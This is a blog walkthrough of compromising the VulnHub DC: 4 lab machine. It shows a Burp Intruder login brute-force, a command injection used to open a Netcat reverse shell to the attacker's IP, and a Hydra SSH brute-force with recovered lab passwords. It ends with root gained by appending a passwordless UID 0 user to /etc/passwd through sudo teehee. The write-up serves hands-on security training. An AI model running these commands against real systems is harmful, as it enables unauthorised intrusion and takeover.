# VulnHub - DC: 4 (Write-Up)

_8 min read · February 8, 2026 · by qs18_

---

## Entry Log

In this mini-blog, I’ll be showing you the walkthrough of [**DC: 4**](https://www.vulnhub.com/entry/dc-4,313/) machine from [**VulnHub**](https://www.vulnhub.com/about/).

- Goal: One and Only Flag (Root)
- Difficulty: Easy+
- Machine Author: DCAU7

---

## Getting the Machine IP Address

As usual:

```bash
sudo netdiscover -i eth0 -r 192.168.11.0/24
```

In my case, DC-4 IP address is **192.168.11.140**.

## Scanning for Open Ports

Again as usual:

```bash
sudo nmap -p- -sCV 192.168.11.140
```

![Nmap Output](./img/vulnhub-dc4/Nmap-output.png)

From the scan results, I noticed that:

1. HTTP (port 80) is open.
2. SSH (port 22) is open.
3. Web server is running **nginx 1.15.10**.

I also used [**dirb**](https://www.kali.org/tools/dirb/) and [**dirsearch**](https://www.kali.org/tools/dirsearch/) to further enumerate the website.

![Dirsearch Output](./img/vulnhub-dc4/Dirsearch-output.png)

However, I didn’t find any useful information from this.

---

## Getting the Admin Password

I opened the website in the browser:

![DC: 4 Website - Login](./img/vulnhub-dc4/web-login.png)

I tried login using default credentials such as `admin:admin`, but none worked.

Then I launched [**Burp Suite**](https://www.kali.org/tools/burpsuite/) and opened a the site through Burp’s browser to intercept the login request:

![Burp Suite - Login](./img/vulnhub-dc4/bs1.png)

After capturing the request, I sent it to **Intruder**:

![Burp Suite - Send to Intruder](./img/vulnhub-dc4/bs2.png)

In the password field, I inserted Burp’s payload position markers (§):

![Burp Suite - Markers](./img/vulnhub-dc4/bs3.png)

This tells Burp Intruder where to inject payloads during the brute-force attack.

In the ‘Payloads’ section, I used `john.lst` as the wordlist and started the attack.

![Burp Suite - Payloads](./img/vulnhub-dc4/bs4.png)

After some time, I got the password for admin which is ‘happy’.

![Burp Suite - Admin Password](./img/vulnhub-dc4/bs5.png)

---

## Accessing the Shell

After logging in and playing around in the site, I saw that the 'Run' button executes system commands.

![DC: 4 Website - Inside](./img/vulnhub-dc4/web-in.png)

Then again I intercepted the request, but this time I sent it to **Repeater**.

![Burp Suite - Send to Repeater](./img/vulnhub-dc4/bs6.png)

By modifying the radio field, I saw that system commands were executed on the server.

![Burp Suite - Command Execution](./img/vulnhub-dc4/bs7.png)

This confirmed a **command injection** vulnerability.

So I started a listener using [**Netcat**](https://www.kali.org/tools/netcat/) on my attacking machine.

```bash
nc -lvp 4477
```

- -l → Listening for incoming connections.
- -v → Detailed output about the connection status (verbose).
- -p → Port number that Netcat should bind to and listen on.

Then, inside the radio field, I executed the following payload:

```bash
/bin/nc+-nv+192.168.11.138+4477+-e+/bin/bash
```

- \+ → Space.
- -n → Listener IP address (my attacking machine).
- -v → Verbose.
- -e /bin/bash → Executes `/bin/bash` and grants the remote user terminal access.

![Netcat in Target Machine](./img/vulnhub-dc4/Netcat-target.png)

Then I received the connection

![Netcat Connection](./img/vulnhub-dc4/Netcat-connection.png)

and made it interactive terminal.

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Accessing the SSH

After gaining a shell as `www-data`, I changed directory to `/home` as it typically contains user accounts.

```bash
cd /home
ls *
```

![Target Home](./img/vulnhub-dc4/target-def-home.png)

Since Jim had files and subdir, I focused my enum there. I couldn’t cat `mbox`, but I found `old-passwords.bak` in `jim/backups` folder.

```bash
cd jim
cd backups
cat old-passwords.bak
```

![old-passwords.bak Output](./img/vulnhub-dc4/old-passwd.png)

This file contained a list of passwords. Given that SSH was open on the machine, this means that these passwords are for SSH login.

I then saved these passwords in `passwd.txt` and users (charles, jim and sam) in `user.txt`.

![passwd.txt and user.txt](./img/vulnhub-dc4/bf-files.png)

I used [**Hydra**](https://www.kali.org/tools/hydra/) to test them against the SSH service.

```bash
hydra -L user.txt -P passwd.txt ssh://192.168.11.140
```

- -L → Usernames file.
- -P → Wordlists file.

![Hydra Output](./img/vulnhub-dc4/Hydra-output.png)

Then I logged in to SSH as Jim.

```bash
ssh jim@192.168.11.140
jibril04
```

---

## Switching User to Charles

After successfully logging in to SSH as Jim, the first thing I did was check what Jim is allowed to run with `sudo`.

```bash
sudo -l
```

![Jim sudo Permission](./img/vulnhub-dc4/Jim-sudo-l.png)

Then I `cat` the `mbox` that I previously couldn’t.

```bash
cat mbox
```

![mbox Output](./img/vulnhub-dc4/mbox-output.png)

This is a test email sent by root. Seeing an email immediately suggests system mail. User mailboxes are usually located in `/var/mail/USERNAME`. So I navigated there.

```bash
cd /var/mail
cat jim
```

![Jim Email](./img/vulnhub-dc4/Jim-email.png)

Inside this email, I found the password for Charles.

I then switched to Charles.

```bash
su charles
```

---

## Privilege Escalation

After switching to Charles, I checked what Charles can run with `sudo`.

```bash
sudo -l
```

![Charles sudo Permission](./img/vulnhub-dc4/Charles-sudo-l.png)

As shown here, Charles is allowed to run `teehee` as `root` without a password.

Since I don’t know what `teehee` is:

```bash
/usr/bin/teehee --help
```

![teehee --help Output](./img/vulnhub-dc4/teehee-h.png)

I found out that it behaves similarly to the `tee` command. It reads input from standard input and writes it to a file. Because `teehee` can be executed as root, this means that I can write something to any file on the system with root privileges.

I used this to append a new root-level user to `/etc/passwd`.

```bash
echo "newuser::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
```

- newuser → Username.
- First 0 → Root user.
- Second 0 → Root group.
- /bin/bash → Full shell.
- -a → append the echo text to `/etc/passwd`.

![newuser in /etc/passwd](./img/vulnhub-dc4/newuser.png)

(Note) `/etc/passwd` format:

```bash
username:password:UID:GUID:comment:home:shell
```

I then switched to the new user.

```bash
su newuser
```

![Switching to newuser](./img/vulnhub-dc4/su-newuser.png)

---

## Getting the Flag

Finally, I navigated to the root directory and read the flag.

```bash
cd /root
cat flag.txt
```

![Flag](./img/vulnhub-dc4/flag.png)

Bomba! Settleee.

---

## Session Terminated

DC-4 is a solid easy+ level machine that focuses heavily on enumeration, lateral movement, and privilege escalation through misconfigured sudo binaries. From this machine, I learned how to:

- brute-force web login forms using Burp Suite Intruder
- identify command execution functionality in web applications
- gain a reverse shell using Netcat
- enumerate user directories and backup files
- reuse leaked credentials for SSH access
- understand Linux mail storage (`/var/mail`)
- perform privilege escalation via insecure sudo permissions (`teehee`)
- abuse file-writing binaries to modify `/etc/passwd`

Overall, this lab reinforced the importance of thorough enumeration and understanding how small misconfigurations can lead to full system compromise. Thank you for reading and see you next time!
